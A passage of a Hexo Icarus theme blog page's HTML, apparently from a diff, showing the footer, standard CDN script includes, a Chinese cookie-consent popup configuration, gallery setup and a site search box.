class="is-size-7">©❤POTATO</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "此网站使用Cookie来改善您的体验。",
+          dismiss: "知道了！",
+          allow: "允许使用Cookie",
+          deny: "拒绝",
+          link: "了解更多",
+          policy: "Cookie政策",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
